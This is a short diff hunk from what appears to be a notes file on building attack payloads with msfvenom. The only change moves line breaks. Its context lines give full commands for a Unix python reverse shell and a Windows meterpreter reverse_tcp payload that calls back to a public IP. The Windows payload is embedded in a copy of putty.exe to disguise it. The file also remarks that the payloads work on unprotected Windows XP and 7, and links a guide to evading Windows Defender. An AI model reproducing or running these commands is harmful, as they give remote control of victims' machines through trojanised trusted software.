@@ -9,9 +9,8 @@ $ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > s
 
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=213.32.70.39 LPORT=7777 -x ../putty.exe -f exe-only -o ~/Samples/Bad/putty64-777.exe<br>
 
-<br>
 All the payloads are probably working on Windows XP and 7 though. (If no good antivirus software is installed.)
-
+<br>
 Working exploit that avoids windows defender:<br>
 https://ired.team/offensive-security/defense-evasion/bypassing-windows-defender-one-tcp-socket-away-from-meterpreter-and-cobalt-strike-beacon
 
